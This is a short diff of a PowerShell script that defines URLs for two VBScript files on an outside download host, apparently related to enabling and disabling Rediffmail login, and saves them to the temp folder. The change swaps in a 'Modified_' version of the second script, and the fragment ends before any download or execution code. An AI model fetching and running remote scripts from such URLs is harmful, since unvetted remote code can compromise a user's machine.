@@ -9,9 +9,9 @@ Add-Type -AssemblyName Microsoft.VisualBasic
 $tempDir = $env:TEMP
 $scriptPath = $MyInvocation.MyCommand.Path
 $firstExeUrl = "https://dl.cieverse.com/cios/rediffmail-login-permit/rediffmail-acc-enable.vbs"
-$secondExeUrl = "https://dl.cieverse.com/cios/rediffmail-login-permit/rediffmail-acc-disable.vbs"
+$secondExeUrl = "https://dl.cieverse.com/cios/rediffmail-login-permit/Modified_rediffmail-acc-disable.vbs"
 $firstExePath = Join-Path $tempDir "rediffmail-acc-enable.vbs"
-$secondExePath = Join-Path $tempDir "rediffmail-acc-disable.vbs"
+$secondExePath = Join-Path $tempDir "Modified_rediffmail-acc-disable.vbs"
 
 try {
     # Download first .vbs
